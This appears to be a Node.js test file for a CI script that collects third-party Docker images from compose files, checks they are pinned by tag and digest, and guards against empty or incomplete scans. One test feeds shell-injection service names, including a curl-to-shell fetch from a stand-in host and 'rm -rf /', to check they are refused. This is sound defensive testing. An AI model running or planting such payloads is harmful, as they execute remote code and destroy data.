// Self-tests for the third-party image enumerator (#369). Run with
// `node --test .github/scripts/compose-images.test.mjs`.
//
// The load-bearing cases are the ones that MUST refuse: a mutable tag, a
// bare digest with no tag, and — the one this whole change exists because of —
// an empty result set reporting success. A scan job over zero images is green,
// and that green reads as "every pin is clean" when nothing was examined.

import test from "node:test";
import assert from "node:assert/strict";
import {
  collectThirdPartyImages,
  assertAllPinnedByDigest,
  assertNonEmpty,
  assertProfilesFullyRendered,
  parseBundle,
  formatMatrix,
  run,
} from "./compose-images.mjs";

const DIGEST = "sha256:617c253c5d960e257ec153d582cc62f191461baba6863bd6b498ae062d3d5c19";
const PG_DIGEST = "sha256:3a82e1f56c8f0f5616a11103ac3d47e632c3938698946a7ad26da0df1334744a";

const doc = (services, path = "compose.json") => ({ path, config: { services } });

// --- what counts as third-party -----------------------------------------

test("a service with build: is first-party and is skipped", () => {
  const images = collectThirdPartyImages([
    doc({
      app: { build: { context: ".." } },
      db: { image: `postgres:18.4-trixie@${PG_DIGEST}` },
    }),
  ]);
  assert.deepEqual(images.map((i) => i.ref), [`postgres:18.4-trixie@${PG_DIGEST}`]);
});

test("build: wins even when the service also names an image", () => {
  // Compose lets `image:` name the BUILD OUTPUT. Keying off `image` presence
  // would misclassify a locally built service as third-party and try to pull it.
  const images = collectThirdPartyImages([
    doc({ app: { build: { context: ".." }, image: "cluckwork-api:local" } }),
  ]);
  assert.deepEqual(images, []);
});

test("a service with neither build nor image throws rather than being ignored", () => {
  assert.throws(
    () => collectThirdPartyImages([doc({ mystery: { ports: ["80:80"] } })]),
    /service "mystery" has neither "build" nor "image"/,
  );
});

test("a blank image string is not silently treated as absent", () => {
  assert.throws(
    () => collectThirdPartyImages([doc({ db: { image: "   " } })]),
    /neither "build" nor "image"/,
  );
});

// --- malformed input fails closed ---------------------------------------

test("a document with no services key throws", () => {
  assert.throws(
    () => collectThirdPartyImages([{ path: "c.json", config: {} }]),
    /has no "services" key/,
  );
});

test("services rendered as an array throws", () => {
  assert.throws(
    () => collectThirdPartyImages([{ path: "c.json", config: { services: [] } }]),
    /"services" is not an object/,
  );
});

test("a null service spec throws", () => {
  assert.throws(
    () => collectThirdPartyImages([doc({ db: null })]),
    /service "db" is not an object/,
  );
});

// --- the service name is passed downstream, so it is constrained -----------

test("a service name with shell metacharacters is refused", () => {
  // It reaches an Actions matrix and a log line, and on a fork pull_request the
  // compose file is contributor-controlled. Compose would reject these itself;
  // this refuses to be the layer that relies on that.
  for (const name of ['db"; curl evil.sh |sh; #', "db $(id)", "db`id`", "db\nrm -rf /", "db'"]) {
    assert.throws(
      () => collectThirdPartyImages([doc({ [name]: { image: `postgres:18@${PG_DIGEST}` } })]),
      /outside compose's own \[A-Za-z0-9\._-\]\+ grammar/,
      `expected ${JSON.stringify(name)} to be refused`,
    );
  }
});

test("ordinary compose service names are accepted", () => {
  for (const name of ["db", "otel-collector", "app_1", "web.edge"]) {
    assert.doesNotThrow(() =>
      collectThirdPartyImages([doc({ [name]: { image: `postgres:18@${PG_DIGEST}` } })]),
    );
  }
});

// --- dedupe across files -------------------------------------------------

test("the same digest pinned in two files is scanned once, crediting both", () => {
  const images = collectThirdPartyImages([
    doc({ db: { image: `postgres:18.4-trixie@${PG_DIGEST}` } }, "prod.json"),
    doc({ db: { image: `postgres:18.4-trixie@${PG_DIGEST}` } }, "dev.json"),
  ]);
  assert.equal(images.length, 1);
  assert.deepEqual(images[0].usedBy, ["prod.json:db", "dev.json:db"]);
});

test("different digests of the same repository are distinct images", () => {
  const images = collectThirdPartyImages([
    doc({
      a: { image: `postgres:18.4-trixie@${PG_DIGEST}` },
      b: { image: `postgres:18.4-trixie@${DIGEST}` },
    }),
  ]);
  assert.equal(images.length, 2);
});

// --- the pin gate --------------------------------------------------------

test("tag + digest passes", () => {
  assert.doesNotThrow(() =>
    assertAllPinnedByDigest([
      { ref: `traefik:v3.7.10@${DIGEST}`, usedBy: ["c.json:traefik"] },
      { ref: `ghcr.io/owner/repo:v1.2.3@${DIGEST}`, usedBy: ["c.json:x"] },
      { ref: `registry.example.com:5000/team/app:2026-08-01@${DIGEST}`, usedBy: ["c.json:y"] },
    ]),
  );
});

test("a mutable tag with no digest is rejected — the #369 defect itself", () => {
  assert.throws(
    () => assertAllPinnedByDigest([{ ref: "traefik:v3.5", usedBy: ["deploy/docker-compose.yml:traefik"] }]),
    /not pinned to an immutable digest[\s\S]*traefik:v3\.5[\s\S]*deploy\/docker-compose\.yml:traefik/,
  );
});

test("a bare repository name with no tag at all is rejected", () => {
  assert.throws(
    () => assertAllPinnedByDigest([{ ref: "traefik", usedBy: ["c.json:traefik"] }]),
    /not pinned to an immutable digest/,
  );
});

test("a digest with no tag is rejected — reviewable staleness is the point", () => {
  // `traefik@sha256:...` IS immutable, so it is tempting to accept. It is
  // rejected because a reader cannot tell a digest from last week from one from
  // eight months ago, which is exactly how v3.5 survived unnoticed.
  assert.throws(
    () => assertAllPinnedByDigest([{ ref: `traefik@${DIGEST}`, usedBy: ["c.json:traefik"] }]),
    /not pinned to an immutable digest/,
  );
});

test("a truncated or non-hex digest is rejected", () => {
  for (const ref of [
    "traefik:v3.7.10@sha256:617c253c",
    `traefik:v3.7.10@sha512:${"a".repeat(64)}`,
    `traefik:v3.7.10@sha256:${"g".repeat(64)}`,
    `traefik:v3.7.10@sha256:${"a".repeat(63)}`,
  ]) {
    assert.throws(
      () => assertAllPinnedByDigest([{ ref, usedBy: ["c.json:traefik"] }]),
      /not pinned to an immutable digest/,
      `expected ${ref} to be rejected`,
    );
  }
});

test("every offender is reported, not just the first", () => {
  assert.throws(
    () =>
      assertAllPinnedByDigest([
        { ref: "traefik:v3.5", usedBy: ["c.json:traefik"] },
        { ref: "postgres:18", usedBy: ["c.json:db"] },
      ]),
    /traefik:v3\.5[\s\S]*postgres:18/,
  );
});

// --- the empty-set backstop ---------------------------------------------

test("an empty image set throws instead of reporting a clean scan", () => {
  assert.throws(() => assertNonEmpty([]), /no third-party images found/);
});

test("the empty-set message names the wildcard profile, the likeliest cause", () => {
  assert.throws(() => assertNonEmpty([]), /--profile/);
});

test("a compose document of only built services yields nothing and therefore throws", () => {
  // End-to-end of the dangerous shape: the document is perfectly well-formed,
  // so nothing upstream errors — the scan simply covers zero images.
  const images = collectThirdPartyImages([
    doc({ app: { build: { context: ".." } }, migrate: { build: { context: ".." } } }),
  ]);
  assert.deepEqual(images, []);
  assert.throws(() => assertNonEmpty(images), /no third-party images found/);
});

// --- the render-completeness check ---------------------------------------
//
// This section exists because the check WITHOUT it was verified to pass while
// missing a service: rendering deploy/docker-compose.yml with no `--profile '*'`
// drops the profile-gated traefik and exits 0 on Postgres alone.
//
// It replaced a COUNT comparison between source text and render, which PR #379
// review showed was unsound. The last test here is that exact scenario.

const bundle = (source, declaredProfiles, services) => ({ source, declaredProfiles, config: { services } });

test("no declared profiles means nothing to verify", () => {
  assert.doesNotThrow(() =>
    assertProfilesFullyRendered([bundle("dev.yml", [], { db: { image: "postgres:18" } })]),
  );
});

test("a declared profile carried by a rendered service passes", () => {
  assert.doesNotThrow(() =>
    assertProfilesFullyRendered([
      bundle("prod.yml", ["prod"], {
        db: { image: "postgres:18" },
        traefik: { image: "traefik:v3.7.10", profiles: ["prod"] },
      }),
    ]),
  );
});

test("a declared profile no rendered service carries is refused", () => {
  // The real failure: `--profile '*'` omitted, so traefik is simply gone.
  assert.throws(
    () => assertProfilesFullyRendered([bundle("prod.yml", ["prod"], { db: { image: "postgres:18" } })]),
    /prod\.yml: declares profile\(s\) "prod" that no rendered service carries[\s\S]*--profile/,
  );
});

test("every missing profile is named, across every file", () => {
  assert.throws(
    () =>
      assertProfilesFullyRendered([
        bundle("a.yml", ["prod", "debug"], { db: { image: "postgres:18" } }),
        bundle("b.yml", ["extras"], { db: { image: "postgres:18" } }),
      ]),
    /a\.yml[\s\S]*"prod", "debug"[\s\S]*b\.yml[\s\S]*"extras"/,
  );
});

test("a service listing several profiles satisfies all of them", () => {
  // Compose includes a service when ANY of its profiles is enabled, and the
  // render still reports the whole list — so enabling one must not fail the rest.
  assert.doesNotThrow(() =>
    assertProfilesFullyRendered([
      bundle("c.yml", ["prod", "edge"], { traefik: { image: "traefik:v3", profiles: ["prod", "edge"] } }),
    ]),
  );
});

test("REGRESSION: a drop-and-add that a COUNT check would have missed", () => {
  // Codex's scenario on PR #379. The old guard compared how many `image:`
  // declarations the source text had against how many the render had. An
  // inline mapping (`db: {image: …}`) was invisible to the source-side regex,
  // so its undercount CANCELLED a genuinely dropped profile-gated service and
  // the counts agreed. Counting cannot distinguish "one dropped" from "one
  // dropped and one gained"; profile coverage does not count at all.
  assert.throws(
    () =>
      assertProfilesFullyRendered([
        bundle("prod.yml", ["prod"], { db: { image: "postgres:18" }, extra: { image: "redis:7" } }),
      ]),
    /declares profile\(s\) "prod" that no rendered service carries/,
  );
});

// --- bundle shape fails closed -------------------------------------------

test("a bundle missing declaredProfiles is refused, not defaulted to empty", () => {
  // Defaulting would silently turn the profile check into a no-op that still
  // reports success — the exact class of false green this file guards against.
  assert.throws(
    () => parseBundle("b.json", JSON.stringify({ source: "a.yml", config: { services: {} } })),
    /has no "declaredProfiles" array[\s\S]*an absent one is not an empty one/,
  );
});

test("a bundle missing source or config is refused", () => {
  assert.throws(
    () => parseBundle("b.json", JSON.stringify({ declaredProfiles: [], config: {} })),
    /has no "source" compose-file path/,
  );
  assert.throws(
    () => parseBundle("b.json", JSON.stringify({ source: "a.yml", declaredProfiles: [] })),
    /has no "config" object/,
  );
});

test("declaredProfiles with a non-string entry is refused", () => {
  assert.throws(
    () =>
      parseBundle("b.json", JSON.stringify({ source: "a.yml", declaredProfiles: [1], config: {} })),
    /contains a non-string entry/,
  );
});

test("a non-object bundle is refused", () => {
  assert.throws(() => parseBundle("b.json", "[]"), /bundle is not an object/);
  assert.throws(() => parseBundle("b.json", "null"), /bundle is not an object/);
});

test("parseBundle names the file that was not JSON", () => {
  assert.throws(() => parseBundle("b.json", "services:\n"), /b\.json: not valid JSON/);
});

// --- matrix output -------------------------------------------------------

test("the matrix strips the digest from the display name but not the ref", () => {
  const matrix = JSON.parse(
    formatMatrix([{ ref: `traefik:v3.7.10@${DIGEST}`, usedBy: ["c.json:traefik"] }]),
  );
  assert.deepEqual(matrix, [
    { ref: `traefik:v3.7.10@${DIGEST}`, name: "traefik:v3.7.10", usedBy: "c.json:traefik" },
  ]);
});

test("the matrix is valid JSON for fromJSON() even with several images", () => {
  const out = formatMatrix([
    { ref: `postgres:18.4-trixie@${PG_DIGEST}`, usedBy: ["a:db"] },
    { ref: `traefik:v3.7.10@${DIGEST}`, usedBy: ["a:traefik"] },
  ]);
  assert.equal(JSON.parse(out).length, 2);
  assert.ok(!out.includes("\n"), "matrix must be a single line for GITHUB_OUTPUT");
});

// --- the CLI wrapper -----------------------------------------------------

const files = (map) => ({
  readFile: (p) => {
    if (!(p in map)) throw new Error("ENOENT");
    return map[p];
  },
});

const bundleFile = (source, declaredProfiles, services) =>
  JSON.stringify({ source, declaredProfiles, config: { services } });

test("run() lists refs one per line", () => {
  const out = run(["b.json"], files({
    "b.json": bundleFile("deploy/docker-compose.yml", [], {
      app: { build: {} },
      traefik: { image: `traefik:v3.7.10@${DIGEST}` },
    }),
  }));
  assert.equal(out, `traefik:v3.7.10@${DIGEST}`);
});

test("run() reads several bundles and dedupes", () => {
  const body = bundleFile("x.yml", [], { db: { image: `postgres:18.4-trixie@${PG_DIGEST}` } });
  const out = run(["a.json", "b.json"], files({ "a.json": body, "b.json": body }));
  assert.equal(out.split("\n").length, 1);
});

test("run() with no paths explains itself", () => {
  assert.throws(() => run([], files({})), /usage: compose-images\.mjs/);
});

test("run() rejects an unknown option rather than treating it as a path", () => {
  assert.throws(() => run(["--json", "b.json"], files({})), /unknown option "--json"/);
});

test("run() rejects an unknown --format", () => {
  assert.throws(() => run(["--format", "yaml", "b.json"], files({})), /unknown --format "yaml"/);
});

test("run() names the file it could not read", () => {
  assert.throws(() => run(["missing.json"], files({})), /missing\.json: cannot read/);
});

test("run() names the file that was not JSON", () => {
  assert.throws(
    () => run(["b.json"], files({ "b.json": "services:\n  db:\n" })),
    /b\.json: not valid JSON/,
  );
});

test("run() fails on a mutable pin end-to-end", () => {
  assert.throws(
    () =>
      run(["b.json"], files({
        "b.json": bundleFile("deploy/docker-compose.yml", [], { traefik: { image: "traefik:v3.5" } }),
      })),
    /not pinned to an immutable digest[\s\S]*deploy\/docker-compose\.yml:traefik/,
  );
});

test("run() refuses a render that dropped profile-gated services, end-to-end", () => {
  assert.throws(
    () =>
      run(["b.json"], files({
        "b.json": bundleFile("deploy/docker-compose.yml", ["prod"], {
          db: { image: `postgres:18.4-trixie@${PG_DIGEST}` },
        }),
      })),
    /declares profile\(s\) "prod" that no rendered service carries/,
  );
});

test("run() labels findings by the SOURCE compose file, not the bundle path", () => {
  // The whole reason the source travels in the bundle: a failing scan must tell
  // a reader where to go and edit, which is never /tmp/....json.
  assert.throws(
    () =>
      run(["/tmp/render/xyz.json"], files({
        "/tmp/render/xyz.json": bundleFile("deploy/docker-compose.yml", [], {
          traefik: { image: "traefik:v3.5" },
        }),
      })),
    /deploy\/docker-compose\.yml:traefik/,
  );
});
